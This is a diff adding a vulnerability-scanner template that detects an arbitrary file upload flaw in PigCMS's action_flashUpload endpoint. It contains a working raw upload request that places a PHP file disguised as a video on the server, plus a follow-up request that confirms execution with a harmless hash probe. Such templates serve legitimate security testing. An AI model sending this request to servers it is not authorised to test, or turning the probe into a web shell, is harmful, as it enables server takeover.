@@ -1,0 +1,51 @@
+id: pigcms-action-flashupload-file-upload
+info:
+  name: PigCMS Action FlashUpload File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PigCMS is a management system designed for WeChat marketing. This template detects an arbitrary file upload vulnerability in the `action_flashUpload` function of PigCMS. Attackers can exploit this to upload malicious files and control the server.
+  tags: file-upload
+  reference:
+    - https://xz.aliyun.com/t/10470
+    - https://www.pigcms.com
+http:
+  - raw:
+      - |
+        POST /cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV
+
+        ------WebKitFormBoundaryxtxB7nI0mjqg3VoV
+        Content-Disposition: form-data; name="filePath"; filename="1.php"
+        Content-Type: video/x-flv
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        ------WebKitFormBoundaryxtxB7nI0mjqg3VoV--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "MAIN_URL_ROOT(.*?).php"
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "MAIN_URL_ROOT(.*?).php"
+  - raw:
+      - |
+        GET /cms{{FileName}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+variables:
+  FileName: '{{extractors[0]}}'
